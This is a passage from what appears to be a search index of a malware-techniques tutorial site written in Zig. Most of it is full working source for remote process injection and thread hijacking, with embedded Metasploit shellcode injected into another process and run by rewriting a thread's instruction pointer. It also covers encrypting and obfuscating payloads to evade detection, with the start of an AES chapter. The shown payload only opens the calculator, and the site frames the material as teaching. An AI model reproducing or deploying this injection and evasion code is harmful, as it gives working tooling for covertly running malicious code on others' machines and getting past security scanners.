* 2]CHAR = undefined;\n    var WnDr: [MAX_PATH]CHAR = undefined;\n    var Si = std.mem.zeroes(STARTUPINFOA);\n    var Pi = std.mem.zeroes(PROCESS_INFORMATION);\n\n    Si.cb = @sizeOf(STARTUPINFOA);\n\n    if (GetEnvironmentVariableA(\"WINDIR\", @ptrCast(&amp;WnDr), MAX_PATH) == 0) {\n        print(\"[!] GetEnvironmentVariableA Failed With Error : {d}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    const windir_len = std.mem.indexOfScalar(u8, &amp;WnDr, 0) orelse WnDr.len;\n    const result = std.fmt.bufPrint(&amp;lpPath, \"{s}\\\\System32\\\\{s}\", .{ WnDr[0..windir_len], lpProcessName }) catch {\n        print(\"[!] Failed to format path\\n\", .{});\n        return false;\n    };\n\n    lpPath[result.len] = 0;\n    print(\"\\n\\t[i] Running : \\\"{s}\\\"...\", .{result});\n\n    if (CreateProcessA(null, @ptrCast(&amp;lpPath), null, null, 0, CREATE_SUSPENDED, null, null, &amp;Si, &amp;Pi) == 0) {\n        print(\"[!] CreateProcessA Failed with Error : {d}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    dwProcessId.* = Pi.dwProcessId;\n    hProcess.* = Pi.hProcess;\n    hThread.* = Pi.hThread;\n\n    if (dwProcessId.* != 0) {\n        return true;\n    }\n    return false;\n}\n\n// Inject shellcode into remote process\nfn injectShellcodeToRemoteProcess(hProcess: HANDLE, pShellcode: []const u8, ppAddress: *PVOID) bool {\n    var sNumberOfBytesWritten: SIZE_T = 0;\n    var dwOldProtection: DWORD = 0;\n\n    const payload_size: SIZE_T = pShellcode.len;\n\n    const allocated_memory = VirtualAllocEx(hProcess, null, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (allocated_memory == null) {\n        print(\"\\n\\t[!] VirtualAllocEx Failed With Error : {d}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    ppAddress.* = allocated_memory.?;\n\n    print(\"\\n\\t[i] Allocated Memory At : 0x{X}\\n\", .{@intFromPtr(ppAddress.*)});\n    waitForEnter(\"\\t[#] Press &lt;Enter&gt; To Write Payload ... \");\n\n    if (WriteProcessMemory(hProcess, ppAddress.*, pShellcode.ptr, payload_size, &amp;sNumberOfBytesWritten) == 0 or (sNumberOfBytesWritten != payload_size)) {\n        print(\"\\n\\t[!] WriteProcessMemory Failed With Error : {d}\\n\", .{GetLastError()});\n        return false;\n    }\n    print(\"\\t[i] Successfully Written {d} Bytes\\n\", .{sNumberOfBytesWritten});\n\n    if (VirtualProtectEx(hProcess, @ptrCast(ppAddress.*), payload_size, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection) == 0) {\n        print(\"\\n\\t[!] VirtualProtectEx Failed With Error : {d}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    return true;\n}\n\n// Remote thread hijacking function - debug version\nfn runViaRemoteThreadHijacking(hThread: HANDLE, pAddress: PVOID) bool {\n    // Print structure size for debugging\n    print(\"\\n\\t[DEBUG] CONTEXT structure size: {d} bytes\\n\", .{@sizeOf(CONTEXT)});\n\n    // Initialize context with proper flags\n    var ThreadCtx = std.mem.zeroes(CONTEXT);\n    ThreadCtx.ContextFlags = CONTEXT_FULL; // Try CONTEXT_FULL instead of CONTEXT_CONTROL\n\n    print(\"\\t[DEBUG] ContextFlags set to: 0x{X}\\n\", .{ThreadCtx.ContextFlags});\n\n    // Getting the original thread context\n    if (GetThreadContext(hThread, &amp;ThreadCtx) == 0) {\n        print(\"\\n\\t[!] GetThreadContext Failed With Error : {d}\\n\", .{GetLastError()});\n        print(\"\\t[DEBUG] CONTEXT size: {d}, expected Windows x64 size should be around 1232\\n\", .{@sizeOf(CONTEXT)});\n        return false;\n    }\n\n    print(\"\\t[DEBUG] GetThreadContext succeeded!\\n\", .{});\n    print(\"\\t[DEBUG] Original RIP: 0x{X}\\n\", .{ThreadCtx.Rip});\n\n    // Updating the next instruction pointer to be equal to the payload's address\n    ThreadCtx.Rip = @intFromPtr(pAddress);\n    print(\"\\t[DEBUG] New RIP set to: 0x{X}\\n\", .{ThreadCtx.Rip});\n\n    // Setting the new updated thread context\n    if (SetThreadContext(hThread, &amp;ThreadCtx) == 0) {\n        print(\"\\n\\t[!] SetThreadContext Failed With Error : {d}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    print(\"\\t[DEBUG] SetThreadContext succeeded!\\n\", .{});\n\n    waitForEnter(\"[#] Press &lt;Enter&gt; To Run The Payload ... \");\n    // Resuming suspended thread, so that it runs our shellcode\n    _ = ResumeThread(hThread);\n    // Wait for the thread to complete\n    _ = WaitForSingleObject(hThread, INFINITE);\n\n    return true;\n}\n\n// Main function\npub fn main() !void {\n    var hProcess: HANDLE = undefined;\n    var hThread: HANDLE = undefined;\n    var dwProcessId: DWORD = undefined;\n    var pAddress: PVOID = undefined;\n\n    print(\"[i] Creating '{s}' Process... \", .{TARGET_PROCESS});\n    // We create the \"notepad.exe\" process for injection\n    if (!createSuspendedProcess(TARGET_PROCESS, &amp;dwProcessId, &amp;hProcess, &amp;hThread)) {\n        return;\n    }\n\n    print(\"\\n\\t[i] Target Process Created With Pid : {d}\\n\", .{dwProcessId});\n    print(\"[+] DONE \\n\\n\", .{});\n\n    print(\"[i] Writing Shellcode To The Target Process... \", .{});\n    if (!injectShellcodeToRemoteProcess(hProcess, &amp;calc_payload, &amp;pAddress)) {\n        return;\n    }\n    print(\"[+] DONE \\n\\n\", .{});\n\n    print(\"[i] Hijacking The Target Thread To Run Our Shellcode... \", .{});\n    if (!runViaRemoteThreadHijacking(hThread, pAddress)) {\n        return;\n    }\n    print(\"[+] DONE \\n\\n\", .{});\n\n    waitForEnter(\"[#] Press &lt;Enter&gt; To Quit ... \");\n\n    // Cleanup\n    _ = CloseHandle(hProcess);\n    _ = CloseHandle(hThread);\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/remote_thread_enumeration/","title":"Remote Thread Enumeration","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/remote_thread_enumeration/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>This sample enumerates threads in a remote target process and hijacks one to execute shellcode. The code uses <code>CreateToolhelp32Snapshot</code> to discover processes by name, then enumerates threads within the remote target process to find an accessible one.</p> <p>Remote thread hijacking works by suspending the selected thread, modifying its instruction pointer (RIP) via <code>GetThreadContext</code>/<code>SetThreadContext</code> to point to injected shellcode, then resuming execution. This approach leverages existing legitimate threads in another process rather than creating suspicious new ones, making the malicious activity blend in with normal process behavior while retaining the original thread's stack and execution context.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/remote_thread_enumeration/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\nconst windows = std.os.windows;\nconst WINAPI = windows.WINAPI;\n\n// External Windows API functions not in std.os.windows\nextern \"kernel32\" fn CreateToolhelp32Snapshot(dwFlags: windows.DWORD, th32ProcessID: windows.DWORD) callconv(WINAPI) windows.HANDLE;\nextern \"kernel32\" fn Process32FirstW(hSnapshot: windows.HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) windows.BOOL;\nextern \"kernel32\" fn Process32NextW(hSnapshot: windows.HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) windows.BOOL;\nextern \"kernel32\" fn Thread32First(hSnapshot: windows.HANDLE, lpte: *THREADENTRY32) callconv(WINAPI) windows.BOOL;\nextern \"kernel32\" fn Thread32Next(hSnapshot: windows.HANDLE, lpte: *THREADENTRY32) callconv(WINAPI) windows.BOOL;\nextern \"kernel32\" fn OpenThread(dwDesiredAccess: windows.DWORD, bInheritHandle: windows.BOOL, dwThreadId: windows.DWORD) callconv(WINAPI) ?windows.HANDLE;\nextern \"kernel32\" fn SuspendThread(hThread: windows.HANDLE) callconv(WINAPI) windows.DWORD;\nextern \"kernel32\" fn ResumeThread(hThread: windows.HANDLE) callconv(WINAPI) windows.DWORD;\nextern \"kernel32\" fn GetThreadContext(hThread: windows.HANDLE, lpContext: *CONTEXT) callconv(WINAPI) windows.BOOL;\nextern \"kernel32\" fn SetThreadContext(hThread: windows.HANDLE, lpContext: *const CONTEXT) callconv(WINAPI) windows.BOOL;\nextern \"kernel32\" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) ?windows.HANDLE;\nextern \"kernel32\" fn VirtualAllocEx(\n    hProcess: HANDLE,\n    lpAddress: ?LPVOID,\n    dwSize: SIZE_T,\n    flAllocationType: DWORD,\n    flProtect: DWORD,\n) callconv(WINAPI) ?LPVOID;\n\n// Constants\nconst TH32CS_SNAPPROCESS: windows.DWORD = 0x00000002;\nconst TH32CS_SNAPTHREAD: windows.DWORD = 0x00000004;\nconst THREAD_ALL_ACCESS: windows.DWORD = 0x001FFFFF;\nconst CONTEXT_ALL: windows.DWORD = 0x001003FF;\nconst MAX_PATH: usize = windows.MAX_PATH;\nconst LPVOID = windows.LPVOID;\nconst SIZE_T = windows.SIZE_T;\nconst HANDLE = windows.HANDLE;\nconst BOOL = windows.BOOL;\nconst DWORD = windows.DWORD;\nconst PROCESS_ALL_ACCESS: windows.DWORD = 0x001FFFFF;\n\n// Structures\nconst PROCESSENTRY32W = extern struct {\n    dwSize: windows.DWORD,\n    cntUsage: windows.DWORD,\n    th32ProcessID: windows.DWORD,\n    th32DefaultHeapID: windows.ULONG_PTR,\n    th32ModuleID: windows.DWORD,\n    cntThreads: windows.DWORD,\n    th32ParentProcessID: windows.DWORD,\n    pcPriClassBase: windows.LONG,\n    dwFlags: windows.DWORD,\n    szExeFile: [MAX_PATH]u16,\n};\n\nconst THREADENTRY32 = extern struct {\n    dwSize: windows.DWORD,\n    cntUsage: windows.DWORD,\n    th32ThreadID: windows.DWORD,\n    th32OwnerProcessID: windows.DWORD,\n    tpBasePri: windows.LONG,\n    tpDeltaPri: windows.LONG,\n    dwFlags: windows.DWORD,\n};\n\nconst CONTEXT = extern struct {\n    P1Home: u64,\n    P2Home: u64,\n    P3Home: u64,\n    P4Home: u64,\n    P5Home: u64,\n    P6Home: u64,\n    ContextFlags: DWORD,\n    MxCsr: DWORD,\n    SegCs: u16,\n    SegDs: u16,\n    SegEs: u16,\n    SegFs: u16,\n    SegGs: u16,\n    SegSs: u16,\n    EFlags: DWORD,\n    Dr0: u64,\n    Dr1: u64,\n    Dr2: u64,\n    Dr3: u64,\n    Dr6: u64,\n    Dr7: u64,\n    Rax: u64,\n    Rcx: u64,\n    Rdx: u64,\n    Rbx: u64,\n    Rsp: u64,\n    Rbp: u64,\n    Rsi: u64,\n    Rdi: u64,\n    R8: u64,\n    R9: u64,\n    R10: u64,\n    R11: u64,\n    R12: u64,\n    R13: u64,\n    R14: u64,\n    R15: u64,\n    Rip: u64,\n    FltSave: [512]u8,\n    VectorRegister: [26][16]u8,\n    VectorControl: u64,\n    DebugControl: u64,\n    LastBranchToRip: u64,\n    LastBranchFromRip: u64,\n    LastExceptionToRip: u64,\n    LastExceptionFromRip: u64,\n};\n\n// x64 calc metasploit shellcode\nconst payload = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\nfn toLowerString(allocator: std.mem.Allocator, input: []const u16) ![]u16 {\n    var result = try allocator.alloc(u16, input.len);\n    for (input, 0..) |char, i| {\n        result[i] = if (char &gt;= 'A' and char &lt;= 'Z') char + 32 else char;\n    }\n    return result;\n}\n\nfn getRemoteProcessHandle(allocator: std.mem.Allocator, process_name: []const u16) !struct { pid: windows.DWORD, handle: windows.HANDLE } {\n    var process_entry = PROCESSENTRY32W{\n        .dwSize = @sizeOf(PROCESSENTRY32W),\n        .cntUsage = 0,\n        .th32ProcessID = 0,\n        .th32DefaultHeapID = 0,\n        .th32ModuleID = 0,\n        .cntThreads = 0,\n        .th32ParentProcessID = 0,\n        .pcPriClassBase = 0,\n        .dwFlags = 0,\n        .szExeFile = std.mem.zeroes([MAX_PATH]u16),\n    };\n\n    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (snapshot == windows.INVALID_HANDLE_VALUE) {\n        print(\"\\t[!] CreateToolhelp32Snapshot Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return error.SnapshotFailed;\n    }\n    defer _ = windows.CloseHandle(snapshot);\n\n    if (Process32FirstW(snapshot, &amp;process_entry) == 0) {\n        print(\"\\t[!] Process32FirstW Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return error.ProcessEnumFailed;\n    }\n\n    while (true) {\n        var name_len: usize = 0;\n        for (process_entry.szExeFile) |char| {\n            if (char == 0) break;\n            name_len += 1;\n        }\n\n        if (name_len &gt; 0) {\n            const lower_name = try toLowerString(allocator, process_entry.szExeFile[0..name_len]);\n            defer allocator.free(lower_name);\n\n            const lower_target = try toLowerString(allocator, process_name);\n            defer allocator.free(lower_target);\n\n            if (std.mem.eql(u16, lower_name, lower_target)) {\n                const handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_entry.th32ProcessID);\n                if (handle == null) {\n                    print(\"\\t[!] OpenProcess Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n                    return error.OpenProcessFailed;\n                }\n                return .{ .pid = process_entry.th32ProcessID, .handle = handle.? };\n            }\n        }\n\n        if (Process32NextW(snapshot, &amp;process_entry) == 0) break;\n    }\n\n    return error.ProcessNotFound;\n}\n\n// Modified to find a suitable thread (not in alertable wait state)\nfn getRemoteThreadHandle(process_id: windows.DWORD) !struct { tid: windows.DWORD, handle: windows.HANDLE } {\n    var thread_entry = THREADENTRY32{\n        .dwSize = @sizeOf(THREADENTRY32),\n        .cntUsage = 0,\n        .th32ThreadID = 0,\n        .th32OwnerProcessID = 0,\n        .tpBasePri = 0,\n        .tpDeltaPri = 0,\n        .dwFlags = 0,\n    };\n\n    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n    if (snapshot == windows.INVALID_HANDLE_VALUE) {\n        print(\"\\t[!] CreateToolhelp32Snapshot Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return error.SnapshotFailed;\n    }\n    defer _ = windows.CloseHandle(snapshot);\n\n    if (Thread32First(snapshot, &amp;thread_entry) == 0) {\n        print(\"\\t[!] Thread32First Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return error.ThreadEnumFailed;\n    }\n\n    var candidate_threads: [10]windows.DWORD = undefined;\n    var candidate_count: usize = 0;\n\n    // Collect all threads from the target process\n    while (true) {\n        if (thread_entry.th32OwnerProcessID == process_id and candidate_count &lt; candidate_threads.len) {\n            candidate_threads[candidate_count] = thread_entry.th32ThreadID;\n            candidate_count += 1;\n        }\n        if (Thread32Next(snapshot, &amp;thread_entry) == 0) break;\n    }\n\n    // Try to open each thread\n    for (candidate_threads[0..candidate_count]) |thread_id| {\n        const handle = OpenThread(THREAD_ALL_ACCESS, 0, thread_id);\n        if (handle != null) {\n            print(\"\\t[i] Successfully opened thread {}\\n\", .{thread_id});\n            return .{ .tid = thread_id, .handle = handle.? };\n        } else {\n            print(\"\\t[!] Failed to open thread {} with error: {}\\n\", .{ thread_id, windows.kernel32.GetLastError() });\n        }\n    }\n\n    return error.ThreadNotFound;\n}\n\nfn injectShellcodeToRemoteProcess(process_handle: windows.HANDLE, shellcode: []const u8) !*anyopaque {\n    // Step 1: Allocate memory in remote process\n    const address = VirtualAllocEx(\n        process_handle,\n        null,\n        shellcode.len,\n        windows.MEM_COMMIT | windows.MEM_RESERVE,\n        windows.PAGE_READWRITE,\n    );\n\n    if (address == null) {\n        print(\"\\t[!] VirtualAllocEx Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return error.VirtualAllocFailed;\n    }\n\n    print(\"\\t[i] Allocated Memory At: 0x{X}\\n\", .{@intFromPtr(address)});\n\n    print(\"\\t[#] Press &lt;Enter&gt; To Write Payload ... \", .{});\n    waitForEnter();\n\n    // Step 2: Write shellcode to allocated memory\n    if (windows.WriteProcessMemory(process_handle, address, shellcode)) |bytes_written| {\n        if (bytes_written != shellcode.len) {\n            print(\"[!] {}/{} bytes memory written\\n\", .{ bytes_written, shellcode.len });\n            return error.IncompleteWrite;\n        }\n    } else |err| {\n        print(\"\\t[!] WriteProcessMemory Failed With Error: {}\\n\", .{err});\n        return error.WriteProcessMemoryFailed;\n    }\n    print(\"\\t[i] Successfully Written {} Bytes\\n\", .{shellcode.len});\n\n    // Step 3: Change memory protection to executable\n    const old_protection = windows.VirtualProtectEx(\n        process_handle,\n        address,\n        shellcode.len,\n        windows.PAGE_EXECUTE_READWRITE,\n    ) catch |err| {\n        print(\"\\t[!] VirtualProtectEx Failed With Error: {}\\n\", .{err});\n        return error.VirtualProtectFailed;\n    };\n\n    _ = old_protection;\n    return address.?;\n}\n\n// Enhanced thread hijacking with better error handling and verification\nfn hijackThread(thread_handle: windows.HANDLE, address: *anyopaque) !bool {\n    var thread_context = std.mem.zeroes(CONTEXT);\n    thread_context.ContextFlags = CONTEXT_ALL;\n\n    print(\"\\t[DEBUG] Target shellcode address: 0x{X}\\n\", .{@intFromPtr(address)});\n\n    // Step 1: Suspend the thread\n    print(\"\\t[DEBUG] Suspending thread...\\n\", .{});\n    const suspend_count = SuspendThread(thread_handle);\n    if (suspend_count == 0xFFFFFFFF) {\n        const error_code = windows.kernel32.GetLastError();\n        print(\"\\t[!] SuspendThread Failed With Error: {} (0x{X})\\n\", .{ error_code, error_code });\n        return false;\n    }\n    print(\"\\t[i] Thread suspended (suspend count: {})\\n\", .{suspend_count});\n\n    // Step 2: Get thread context\n    print(\"\\t[DEBUG] Getting thread context...\\n\", .{});\n    if (GetThreadContext(thread_handle, &amp;thread_context) == 0) {\n        const error_code = windows.kernel32.GetLastError();\n        print(\"\\t[!] GetThreadContext Failed With Error: {} (0x{X})\\n\", .{ error_code, error_code });\n        _ = ResumeThread(thread_handle);\n        return false;\n    }\n\n    print(\"\\t[i] Original RIP: 0x{X}\\n\", .{thread_context.Rip});\n    print(\"\\t[i] Original RSP: 0x{X}\\n\", .{thread_context.Rsp});\n\n    // Step 3: Modify the instruction pointer to our shellcode\n    thread_context.Rip = @intFromPtr(address);\n    print(\"\\t[i] New RIP: 0x{X}\\n\", .{thread_context.Rip});\n\n    // Step 4: Set the modified context\n    print(\"\\t[DEBUG] Setting new thread context...\\n\", .{});\n    if (SetThreadContext(thread_handle, &amp;thread_context) == 0) {\n        const error_code = windows.kernel32.GetLastError();\n        print(\"\\t[!] SetThreadContext Failed With Error: {} (0x{X})\\n\", .{ error_code, error_code });\n        _ = ResumeThread(thread_handle);\n        return false;\n    }\n\n    // Step 5: Verify the context was set correctly\n    var verify_context = std.mem.zeroes(CONTEXT);\n    verify_context.ContextFlags = CONTEXT_ALL;\n    if (GetThreadContext(thread_handle, &amp;verify_context) != 0) {\n        print(\"\\t[i] Verified RIP: 0x{X}\\n\", .{verify_context.Rip});\n        if (verify_context.Rip != @intFromPtr(address)) {\n            print(\"\\t[!] WARNING: RIP verification failed!\\n\", .{});\n        }\n    }\n\n    print(\"\\t[#] Press &lt;Enter&gt; To Resume Thread And Execute Shellcode ... \", .{});\n    waitForEnter();\n\n    // Step 6: Resume the thread\n    print(\"\\t[DEBUG] Resuming thread...\\n\", .{});\n    const resume_count = ResumeThread(thread_handle);\n    if (resume_count == 0xFFFFFFFF) {\n        const error_code = windows.kernel32.GetLastError();\n        print(\"\\t[!] ResumeThread Failed With Error: {} (0x{X})\\n\", .{ error_code, error_code });\n        return false;\n    }\n    print(\"\\t[i] Thread resumed (resume count: {})\\n\", .{resume_count});\n\n    // Give the shellcode some time to execute\n    print(\"\\t[i] Waiting for shellcode execution...\\n\", .{});\n\n    // ONLY call WaitForSingleObject if everything succeeded\n    _ = try windows.WaitForSingleObject(thread_handle, windows.INFINITE);\n\n    return true;\n}\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    const args = try std.process.argsAlloc(allocator);\n    defer std.process.argsFree(allocator, args);\n\n    if (args.len &lt; 2) {\n        print(\"[!] Usage: {s} &lt;Process Name&gt;\\n\", .{args[0]});\n        return;\n    }\n\n    const process_name_utf8 = args[1];\n    const process_name_utf16 = try std.unicode.utf8ToUtf16LeAllocZ(allocator, process_name_utf8);\n    defer allocator.free(process_name_utf16);\n\n    print(\"[i] Searching For Process Id Of \\\"{s}\\\" ...\\n\", .{process_name_utf8});\n    const process_info = getRemoteProcessHandle(allocator, process_name_utf16) catch |err| {\n        switch (err) {\n            error.ProcessNotFound =&gt; {\n                print(\"[!] Process \\\"{s}\\\" is Not Found\\n\", .{process_name_utf8});\n                return;\n            },\n            else =&gt; return err,\n        }\n    };\n    defer _ = windows.CloseHandle(process_info.handle);\n\n    print(\"\\t[i] Found Target Process Pid: {}\\n\", .{process_info.pid});\n    print(\"[+] DONE\\n\\n\", .{});\n\n    print(\"[i] Searching For A Thread Under The Target Process ...\\n\", .{});\n    const thread_info = getRemoteThreadHandle(process_info.pid) catch |err| {\n        switch (err) {\n            error.ThreadNotFound =&gt; {\n                print(\"[!] No Accessible Thread is Found\\n\", .{});\n                return;\n            },\n            else =&gt; return err,\n        }\n    };\n    defer _ = windows.CloseHandle(thread_info.handle);\n\n    print(\"\\t[i] Found Target Thread Of Id: {}\\n\", .{thread_info.tid});\n    print(\"[+] DONE\\n\\n\", .{});\n\n    print(\"[i] Writing Shellcode To The Target Process ...\\n\", .{});\n    const injected_address = injectShellcodeToRemoteProcess(process_info.handle, &amp;payload) catch return;\n    print(\"[+] DONE\\n\\n\", .{});\n\n    print(\"[i] Hijacking The Target Thread To Run Our Shellcode ...\\n\", .{});\n    if (!try hijackThread(thread_info.handle, injected_address)) {\n        return;\n    }\n    print(\"[+] DONE\\n\\n\", .{});\n\n    print(\"[#] Press &lt;Enter&gt; To Quit ... \", .{});\n    waitForEnter();\n}\n</code></pre>"},{"location":"Basic-Payload-Management/intro/","title":"Basic Payload Management","text":"<p>This section introduces fundamental techniques for storing, encrypting, obfuscating, and executing payloads. Topics include:</p> <ul> <li>Payload placement in different sections of an executable</li> <li>Encryption routines (XOR, RC4, AES)</li> <li>Simple obfuscation methods</li> <li>Loading payloads via shellcode or DLLs</li> </ul> <p>Use these chapters to learn how to prepare payloads for later delivery and execution while evading simple detection.</p>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/","title":"AES Encryption","text":""},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Advanced Encryption Standard (AES) is a widely used symmetric cipher. Malware often encrypts embedded payloads with AES so that static scanners cannot easily identify the malicious code. This chapter demonstrates multiple ways to perform AES encryption in Zig, including using Windows' <code>bcrypt</code> API and simple implementations. The encrypted payload is decrypted in memory right before execution, keeping the malicious bytes hidden on disk and complicating analysis.</p>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#using-bcrypth","title":"Using bcrypt.h","text":"<p>bcrypt.h header - MSDN</p>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#defining-aes-struct","title":"Defining AES struct","text":"main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst KEY_SIZE = 32;\nconst IV_SIZE = 16;\n\nconst DWORD = u32;\nconst BOOL = i32;\nconst PBYTE = [*]u8;\nconst PVOID = ?*anyopaque;\nconst ULONG = u32;\nconst NTSTATUS = i32;\n\nconst BCRYPT_BLOCK_PADDING = 0x00000001;\nconst STATUS_SUCCESS: NTSTATUS = 0;\n\nconst BCRYPT_AES_ALGORITHM = std.unicode.utf8ToUtf16LeStringLiteral(\"AES\");\nconst BCRYPT_CHAINING_MODE = std.unicode.utf8ToUtf16LeStringLiteral(\"ChainingMode\");\nconst BCRYPT_CHAIN_MODE_CBC = std.unicode.utf8ToUtf16LeStringLiteral(\"ChainingModeCBC\");\n\nconst AES = extern struct {\n    pPlainText: ?PBYTE,\n    dwPlainSize: DWORD,\n    pCipherText: ?PBYTE,\n    dwCipherSize: DWORD,\n    pKey: ?PBYTE,\n    pIv: ?PBYTE,\n};\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Encryption/AES/#external-functions-in-bcryptdll","title":"External functions In <code>bcrypt.dll</code>","text":"<ol> <li> <p><code>BCryptOpenAlgorithmProvider</code>:    Retrieves a handle to a CNG(Windows Cryptography API: Next Generation) algorithm provider, this is the first step in using any cryptographic algorithm.</p> main.zig<pre><code>extern \"bcrypt\" fn BCryptOpenAlgorithmProvider(\n    phAlgorithm: *?*anyopaque,\n    pszAlgId: [*:0]const u16,\n    pszImplementation: ?[*:0]const u16,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n</code></pre> </li> <li> <p><code>BCryptCloseAlgorithmProvider</code>:    Closes and algorithm provider handle opened by <code>BCryptOpenAlgorithmProvider</code></p> main.zig<pre><code>extern \"bcrypt\" fn BCryptCloseAlgorithmProvider(\n    hAlgorithm: ?*anyopaque,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n</code></pre> </li> <li> <p><code>BCryptGetProperty</code>:    Retrieves the value of a property for a CNG object</p> main.zig<pre><code>extern \"bcrypt\" fn BCryptGetProperty(\n    hObject: ?*anyopaque,\n    pszProperty: [*:0]const u16,\n    pbOutput: PBYTE,\n    cbOutput: ULONG,\n    pcbResult: *ULONG,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n</code></pre> </li> <li> <p><code>BCryptSetProperty</code>:    Sets the value of a property for a CNG object</p> main.zig<pre><code>extern \"bcrypt\" fn BCryptSetProperty(\n    hObject: ?*anyopaque,\n    pszProperty: [*:0]const u16,\n    pbInput: PBYTE,\n    cbInput: ULONG,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n</code></pre> </li> <li> <p><code>BCryptGenerateSymmetricKey</code>:    Creates a symmetric key object from a supplied key</p> main.zig<pre><code>extern \"bcrypt\" fn BCryptGenerateSymmetricKey(\n    hAlgorithm: ?*anyopaque,\n    phKey: *?*anyopaque,\n    pbKeyObject: PBYTE,\n    cbKeyObject: ULONG,\n    pbSecret: PBYTE,\n    cbSecret: ULONG,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n</code></pre> </li> <li> <p><code>BCryptDestroyKey</code>:    Destroys a symmetric key handle</p> main.zig<pre><code>extern \"bcrypt\" fn BCryptDestroyKey(hKey: ?*anyopaque) callconv(.C) 